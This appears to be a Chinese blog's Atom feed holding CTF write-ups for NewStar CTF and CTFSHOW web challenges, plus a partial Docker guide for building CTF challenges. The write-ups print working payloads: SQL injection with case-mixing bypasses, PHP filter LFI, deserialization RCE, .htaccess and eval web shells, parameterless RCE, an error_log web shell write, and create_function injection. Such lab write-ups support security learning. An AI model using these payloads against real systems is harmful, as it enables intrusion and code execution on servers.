<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>初零·b10g~🥝</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2023-10-13T12:48:36.801Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NewStar CTF WEEK 2</title>
    <link href="https://bowuchuling.github.io/posts/1837dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837dhw7.html</id>
    <published>2023-10-13T12:41:55.196Z</published>
    <updated>2023-10-13T12:48:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK 2</h1><h2 id="游戏高手">游戏高手</h2><p>简单的JS小游戏</p><p><strong>如果你像我一样无聊，你可以尝试将飞机拉至最下方，静等flag</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013201850838.png" alt="image-20231013201850838"></p><p>找到了下面这段代码，大概就是玩够分数给你信息的意思</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202021581.png" alt="image-20231013202021581"></p><p>这里执行在控制台进行变量定义，然后直接去送，得到flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202154600.png" alt="image-20231013202154600"></p><h2 id="include-0。0">include 0。0</h2><p>源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>考伪协议，过滤了base和rot，这里用其他编码进行绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stringa</span> = <span class="string">&quot;获得的加密字符&quot;</span>;</span><br><span class="line"><span class="variable">$stringb</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$stringa</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="string">&#x27;UCS-2BE&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stringb</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-sql">ez_sql</h2><p>sql注入，大写绕过，列数5列，直接看出来的</p><p>爆库名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> Select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,dataabse() --+</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unioN</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,Group_Concat(<span class="built_in">Table_nAme</span>) <span class="keyword">fRom</span> infoRmAtion_schemA.<span class="keyword">tAbles</span> <span class="keyword">whEre</span> tAble_schemA=<span class="string">&#x27;ctf&#x27;</span> #</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,gRoup_coNcat(<span class="built_in">cOlumn_nAme</span>) <span class="keyword">fRom</span> infOrmAtion_schEma.<span class="keyword">cOlumns</span> <span class="keyword">whEre</span> <span class="built_in">tAble_Name</span>=<span class="string">&#x27;here_is_flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> sElect <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,gRoup_cOncat(flag) fRom here_is_flag --+</span><br></pre></td></tr></table></figure><h2 id="Unserialize？">Unserialize？</h2><p>实例化类自动触发destruct类，利用echo触发tostring方法，进行命令执行</p><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again">Upload again!</h2><p>经过测试发现是对shell的内容进行了检查，感觉是检查了问号，文件后缀也做了过滤，php指定是传不上去了，这里使用.htaccess配置文件解析.jpg后缀进行绕过</p><p>.htaccess</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>chu0.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;chu0&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013203719913.png" alt="image-20231013203719913"></p><h2 id="R-C-E">R!!C!!E!!</h2><p>首先是一个.git信息泄露，用GitHack-master获取.git的内容</p><p>源码如下：bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的无参数rce，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(array_pop(getallheaders()));   //getall...获取请求头信息，pop出最后一个进行eval</span><br></pre></td></tr></table></figure><p>请求头添加</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZZZsd123</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span><br><span class="line">//这里注意，请求头的首字母一定靠后，这样才能保证他是请求头的最后一个，才能被eval正确的执行</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">新手赛，感谢主办方</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW红包题目</title>
    <link href="https://bowuchuling.github.io/posts/1824e02a.html"/>
    <id>https://bowuchuling.github.io/posts/1824e02a.html</id>
    <published>2023-08-13T12:07:05.818Z</published>
    <updated>2023-08-13T13:24:45.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW红包题目"><a href="#CTFSHOW红包题目" class="headerlink" title="CTFSHOW红包题目"></a>CTFSHOW红包题目</h1><h3 id="红包7"><a href="#红包7" class="headerlink" title="红包7"></a>红包7</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是第一次见到了extract函数，百度之后知道了是一个赋值函数，主要用于变量覆盖方面</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20230813202700381.png" alt="image-20230813202700381"></p><p>大致意思就是</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们传入:</span><br><span class="line">?<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">结果为：</span><br><span class="line">$<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">给<span class="keyword">name</span>进行了一波赋值</span><br></pre></td></tr></table></figure><p>ini_set()函数可以对php.ini进行配置，看了wp之后知道这题是需要更改报错日志路径进而写入恶意命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">这里还用到了一个技巧，系统命令可以使用%<span class="number">00</span>进行截断，进而触发报错，而报错会把所有的报错信息全部写入报错日志当中，而我们可以通过ini_set修改报错日志的储存路径，进而实现了恶意命令的写入。类似于包含日志。</span><br><span class="line">payload2：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">2</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&#x27; | base64 -d &gt; /var/www/html/chu1.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="红包8"><a href="#红包8" class="headerlink" title="红包8"></a>红包8</h2><p><strong>源代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><p>这道题目主要考察的是create_function()的做法，之前接触过两个相关题目，不过都是在第二个参数上做文章，多次测试之后发现由于base64编码的限制似乎无计可施，尝试所有该编码函数的漏洞，没查到。最后一招，摇人。得到了payload，后续网上搜得到了以下博客：<a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail">https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail</a></p><p>这里是在第一个参数上做文章，举例</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&quot;<span class="variable">$a</span>=123&quot;</span>,<span class="string">&quot;return 1;&quot;</span>)</span><br><span class="line"></span><br><span class="line">该函数处理之后将会得到以下匿名函数</span><br><span class="line"></span><br><span class="line">name1(<span class="variable">$a</span>=<span class="number">123</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这里我们就可以在第一个参数的位置进行闭合</span><br><span class="line"><span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;phpinfo()<span class="comment">;/*</span></span><br><span class="line">这个时候就可以执行任意php代码啦</span><br><span class="line">?<span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;<span class="params">system</span>(<span class="string">&quot;cat /f*&quot;</span>)<span class="comment">;/*&amp;value=1</span></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctfshow，狠狠掐小米！</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>关于使用docker的一些感想，持续更新中...</title>
    <link href="https://bowuchuling.github.io/posts/7ea82466.html"/>
    <id>https://bowuchuling.github.io/posts/7ea82466.html</id>
    <published>2023-07-26T17:10:39.718Z</published>
    <updated>2023-07-28T05:43:38.450Z</updated>
    
    <content type="html"><![CDATA[<p>  docker教程其实很早就在酝酿了，但因为自己天赋不高，搞不明白，一直没有出，近期由于有出题需求，不得不又拾起vm里藏灰了的docker，又深入学习了一番，这里就不得不提到网上的各种博客，看了好长时间都看不懂，浪费了大把时间，由此被我授予了无良博客的头衔。这篇博客主要是介绍一下CTF中出题所需要的docker操作。持续更新中……</p><h2 id="docker配置教程"><a href="#docker配置教程" class="headerlink" title="docker配置教程"></a>docker配置教程</h2><h3 id="更换镜像源（阿里云）"><a href="#更换镜像源（阿里云）" class="headerlink" title="更换镜像源（阿里云）"></a>更换镜像源（阿里云）</h3><p><strong>选择性更换，如果再进行下面指令时没有报错，可以选择不更换</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//打开存源文件</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//进入编辑模式</span></span><br><span class="line">将地址黏贴进去</span><br><span class="line">按ESC                           <span class="comment">//退出编辑模式</span></span><br><span class="line">输入:wq                         <span class="comment">//保存并退出</span></span><br></pre></td></tr></table></figure><p><strong>镜像源地址，全部复制进去</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="创建docker"><a href="#创建docker" class="headerlink" title="创建docker"></a>创建docker</h3><p><strong>1.下载docker镜像</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.搜索\下载 服务器镜像</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>搜索服务器镜像，可以不搜</span><br><span class="line">docker pull 镜像名    <span class="regexp">//</span>例如docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.创建docker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name 给docker取个名 -p 想开放的端口:80 服务器镜像名</span></span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//创建tutum/lamp服务器，命名为dockername1，开放<span class="number">180</span>端口供访问</span><br></pre></td></tr></table></figure><p><strong>4.普通题目复制</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把文件拉到linux目录下</span><br><span class="line">docker cp 文件名 docker名<span class="symbol">:/var/www/html</span>   </span><br><span class="line">/<span class="regexp">/把文件复制到docker的/var</span><span class="regexp">/www/html</span>目录下，记得命名一个index.php，文件的其他人权限得设置成可读</span><br></pre></td></tr></table></figure><p><strong>5.（可有可无）进入docker查看</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名 <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>进入之后就随便命令执行就好了，没问题就访问宿主机ip+端口看看，能访问就没问题</span><br></pre></td></tr></table></figure><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p><strong>查看docker容器状态</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">ps</span>  </span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure><p><strong>查看docker镜像状态</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>新建docker容器</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name 起个名 -p 开放端口:映射端口 tutum/lamp</span><br><span class="line"><span class="meta">#映射端口前首先确定端口没有被占用</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//容器后台运行。</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//指定映射端口。</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//随机映射高端口</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>复制文件进入docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [本地路径] [container id]<span class="symbol">:</span>[container 路径]</span><br><span class="line">例如:</span><br><span class="line">docker cp flag.php docker名字<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>查询宿主机ip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>进入指定docker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名字 <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#如果从这个容器退出，不会导致容器的停止，推荐使用 docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//让容器的标准输入保持打开。</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//让docker分配一个伪终端并绑定到容器的标准输出上。</span></span></span><br></pre></td></tr></table></figure><p><strong>退出当前docker容器</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>启动容器</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> 容器ID</span><br></pre></td></tr></table></figure><p><strong>查看所有存在的容器</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]或者是[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#需要先把容器停掉</span></span><br></pre></td></tr></table></figure><h2 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h2><p>十分感谢nss的师傅提供的模板啦，这里附上链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="利用dockerfile和docker-compose出题"><a href="#利用dockerfile和docker-compose出题" class="headerlink" title="利用dockerfile和docker-compose出题"></a>利用dockerfile和docker-compose出题</h2><p>这里感谢f12大佬提供的帮助</p><h3 id="这俩东西是什么？"><a href="#这俩东西是什么？" 